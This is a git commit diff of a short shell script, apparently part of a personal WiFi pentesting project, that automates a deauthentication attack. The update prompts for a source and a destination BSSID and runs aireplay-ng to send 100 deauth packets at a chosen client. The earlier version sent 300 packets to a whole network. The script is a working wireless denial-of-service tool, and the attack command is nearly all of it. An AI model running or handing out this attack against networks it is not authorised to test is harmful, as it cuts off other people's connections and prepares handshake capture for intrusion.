278a33036d6fef80252fd740ba40a930edb73ed1
Rohit Soni <92707347+rohitsoniinfo@users.noreply.github.com>
2023-09-19 21:28:15 +0530

    Update postAutomate.sh

--- postAutomate.sh
+++ postAutomate.sh
@@ -4,10 +4,13 @@
 cd /home/kali/WifiPentesting/testingSomething
 
 # Prompt the user to enter the BSSID (MAC address) of the target WiFi network.
-echo "Enter the BSSID of the target:"
-read BSSID
+echo "Enter the BSSID of the source target:"
+read BSSID_S
+echo "Enter the BSSID of the destination target:"
+read BSSID_D
+
 
 # Use aireplay-ng to deauthenticate devices connected to the target WiFi network.
 # The '-a' flag specifies the BSSID, and '--deauth 300' indicates to send 300 deauthentication packets.
 # 'wlan0' is assumed to be your wireless interface.
-sudo aireplay-ng -a $BSSID --deauth 300 wlan0
+sudo aireplay-ng --deauth 100 -a $BSSID_S -c $BSSID_D wlan0
